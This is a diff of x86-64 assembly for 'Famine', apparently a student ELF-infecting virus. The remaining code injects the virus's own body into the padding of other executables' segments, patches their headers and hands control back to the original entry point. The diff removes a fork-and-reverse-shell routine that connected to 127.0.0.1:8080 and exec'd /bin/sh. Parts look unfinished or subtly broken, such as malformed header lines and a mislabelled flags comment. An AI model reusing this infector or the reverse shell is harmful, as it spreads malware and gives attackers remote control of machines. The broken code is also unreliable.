@@ -1,60 +1,45 @@
-%include "src/famine.inc"
-
+%include "./famine.inc"
 BITS 64
-default rel
+org 0x0                     ; PIE = pas d’adresse fixe
 
-section .text
-	global _start
+; ELF64 Header (64 bytes)
+db 0x7F, "ELF"              ; Magic
+db 2                        ; EI_CLASS = ELF64
+db 1                        ; EI_DATA = little endian
+db 1                        ; EI_VERSION
+db 0                        ; EI_OSABI
+db 0                        ; EI_ABIVERSION
+times 7 db 0                ; padding
+
+dw 3                        ; e_type = ET_DYN (PIE)
+dw 0x3E                     ; e_machine = x86_64
+dd 1                        ; e_version
+dq _start                   ; e_entry (relative to base)
+dq 64                       ; e_phoff
+dq 0                        ; e_shoff
+dd 0                        ; e_flags
+dw 64                       ; e_ehsize
+dw 56                       ; e_phentsize
+dw 1                        ; e_phnum
+dw 0                        ; e_shentsize
+dw 0                        ; e_shnum
+dw 0                        ; e_shstrndx
+
+; Program Header
+dd 1                        ; p_type = PT_LOAD
+dd 7                        ; p_flags = R | X
+dq 0                        ; p_offset
+dq 0                        ; p_vaddr
+dq 0                        ; p_paddr
+dq end_addr - _start - 0x1000:                ; p_filesz
+dq end_addr -_start:                ; p_memsz
+dq 0x1000                   ; p_align
+
+
 
 ; %rdi %rsi %rdx %r10 %r8 %r9
 
 _start:
-	PUSH_ALL
-	mov		rax, SYS_open
-	lea		rdi, [rel self]
-	xor		rsi, rsi
-	xor		rdx, rdx
-	syscall
-	cmp		rax, 0
-
-	jle		.just_quit
-	mov		r12, rax
-
-	mov		rax, SYS_pread64
-	mov		rdi, r12
-	lea		rsi, [rel zero]
-	mov		rdx, 1
-	mov		r10, 10
-	syscall
-
-	.just_quit:
-	mov		rax, SYS_close
-	mov		rdi, r12
-	syscall
-	POP_ALL
-	mov		al, BYTE [rel zero]	; SI ICI = 0, ca signfiie c'est famine
-	test	al, al
-	jz		.continue
-
-	mov		rax, SYS_fork
-	syscall
-	cmp		eax, 0
-	jng		.continue_fork
-
-	mov		rax, [rel entry]
-	mov		[rel new_entry], rax
-	mov		rax, [rel new_entry]
-	sub		rax, [rel old_entry]
-	lea		rdi, [rel _start]
-	sub		rdi, rax
-	mov		[rel new_entry], rdi
-
-	jmp		[rel new_entry]
-
-.continue_fork:
-	mov		rax, SYS_setsid
-	syscall
-.continue:
 	PUSH_ALL
 	jmp		end_
 
@@ -461,11 +446,10 @@ print_rax:
 	.not_usseles_ph:
 	dec	rcx
 	jnz	.loop
+
+
 		cmp		r13, 1
 		je		.return
-
-
-		cmp		r13, 1
 		mov		rax, [rel p_vaddr]
 		;add		rax, [rel elfb + ehdr.e_shoff]
 		;add		rax, r15	-> Tant que ca crash pas on add pas!
@@ -584,7 +568,6 @@ print_rax:
 		; Here start the injection
 
 
-
 		mov		rax, [rel elfb + 0x18]		; e_entry
 		mov		[old_entry], rax
 
@@ -600,29 +583,12 @@ print_rax:
 		call	infection_0
 		test	rax, rax
 		jz		.close_file
-
-		lea		rdi, [rel elfp0]	; Cleaning du buffer elfp0
-		mov		rcx, 7
-		xor		rax, rax
-		rep		stosq
-
-		lea		rdi, [rel elfp1]	; Cleaning du buffer elfp1
-		mov		rcx, 7
-		xor		rax, rax
-		rep		stosq
-
-
-		movzx	rcx, word [rel elfb + 0x38]	; e_phnum
-		movzx	rdi, word [rel elfb + 0x36]	; e_phentisize
-		xor		r11, r11
-		xor		r10, r10
-
 		; call _add_empty_section
+
 		.start_loop_phdr:
 			test	rcx, rcx
 			jz		.end_loop_phdr
 			mov		r10, rcx
-			sub		r10, rcx
 			imul	r10, rdi
 			add		r10, 64
 			push	r11
@@ -636,7 +602,7 @@ print_rax:
 			pop		rdi
 			pop		rcx
 			pop		r11
-			xor		rax, rax
+
 			; r9 -> target_phdr offset
 			cmp		dword [rel elfp0], 1 ; est-ce un load ?
 			jne		.next_it_phdr
@@ -660,22 +626,25 @@ print_rax:
 			pop		rcx
 			pop		r11
 
+
 		.next_it_phdr:
 			dec		rcx
 			jmp		.start_loop_phdr
 		.end_loop_phdr:
 			test	r11, r11
 			jz		.close_file
+
 			; check padding size
-			; padding = next_header_off - (curr_header_off + header_size)~
-			mov		rax, [rel elfp1 + phdr.p_offset] ; p_offset next
+			; padding = next_header_off - (curr_header_off + header_size)
+			mov		rax, [rel elfp1 + phdr.p_offset] ; p_offset next seg
 			mov		rdx, [rel elfp0 + phdr.p_offset] ; p_offset curr seg
 			add		rdx, [rel elfp0 + phdr.p_filesz]
 			sub		rax, rdx
+
 			; padding < FAMINE_SIZE
 			cmp		rax, FAMINE_SIZE
 			jl		.close_file
-		.skip:
+
 			; mark file for avoid re-infection
 			push	r9
 			push	r11
@@ -730,7 +699,7 @@ print_rax:
 
 			; compute p_memsz
 			mov		rdi, qword [rel elfp1 + phdr.p_memsz]
-			add		rdi, FAMINE_SIZE_NO_BSS
+			add		rdi, FAMINE_SIZE
 			mov		[rel elfp1 + phdr.p_memsz], rdi
 			pop		r11
 
@@ -764,7 +733,7 @@ print_rax:
 			push	r11
 			push	r9
 			lea		rsi, [rel _start]
-			mov		rdx, FAMINE_SIZE_NO_BSS
+			mov		rdx, FAMINE_SIZE
 			mov		r10, r11
 			mov		rdi, r12
 			mov		rax, SYS_pwrite64
@@ -781,6 +750,15 @@ print_rax:
 	ret
 
 end_:
+	mov		rax, [rel entry]
+	mov		[rel new_entry], rax
+
+	mov		rax, [rel new_entry]
+	sub		rax, [rel old_entry]
+	lea		rdi, [rel _start]
+	sub		rdi, rax
+
+	mov		[rel new_entry], rdi
 
 	call	famine
 
@@ -789,7 +767,6 @@ end_:
 	xor		rsi, rsi
 	xor		rdx, rdx
 	syscall
-
 	cmp		rax, 0
 	jle		.just_quit
 	mov		r12, rax
@@ -806,63 +783,17 @@ end_:
 	mov		rdi, r12
 	syscall
 
-
 	.just_quit:
 		POP_ALL
+		mov		al, BYTE [rel zero]
+		test	al, al
+		jz		.exit_ret
 
-		mov		rax, SYS_fork
-		syscall
 
-		cmp		eax, 0
-		jng		.continue_fork
 
-		mov		rax, SYS_exit
-		xor		rdi, rdi
-		syscall
-
-	.continue_fork:
-		mov		rax, SYS_setsid
-		syscall
-
-		mov		rax, SYS_socket
-		mov		rdi, AF_INET
-		mov		rsi, SOCK_STREAM
-		xor		rdx, rdx
-		syscall
-		mov		r12, rax
-
-		mov		rax, SYS_connect
-		mov		rdi, r12
-		lea		rsi, [rel serv_addr]
-		mov		rdx, 16
-		syscall
-		test	rax, rax
-		jnz		.exit_ret
-
-		mov		rax, SYS_dup2
-		mov		rdi, r12
-		mov		rsi, 0
-		syscall
-		mov		rax, SYS_dup2
-		mov		rdi, r12
-		mov		rsi, 1
-		syscall
-		mov		rax, SYS_dup2
-		mov		rdi, r12
-		mov		rsi, 2
-		syscall
-		lea		rax, [rel arg0]
-		mov		[rel argv], rax
-		mov		rax, SYS_execve
-		lea		rdi, [rel shell]
-		lea		rsi, [rel argv]
-		xor		rdx, rdx
-		syscall
+		jmp		[rel new_entry]
 
 	.exit_ret:
-		mov		rax, SYS_close
-		mov		rdi, r12
-		syscall
 
 		mov		rax, SYS_exit
 		xor		rdi, rdi
@@ -885,19 +816,9 @@ end_:
 	paddi	dq 0
 	entry	dq 0
 	exec	dd 7
-	serv_addr:
-		dw AF_INET
-		dw 0x901F			; 8080
-		dd 0x0100007F		; 127.0.0.1
-		times 8 db 0
-		shell:	db '/bin/sh', 0
-		arg0:       db "sh", 0
-		argv:       dq 0, 0
 
 ; NEW HEADER
 new_programheader:
-	elfp0	times 0056 db 0
-	elfp1	times 0056 db 0
 	p_type		dd	1
 	p_flags		dd	7
 	p_offset	dq	0
@@ -911,5 +832,7 @@ new_programheader:
 buffer_bss:
 	padd	times 0512 db 0
 	buff	times 4096 db 0
+	elfp0	times 0056 db 0
+	elfp1	times 0056 db 0
 
 end_addr:
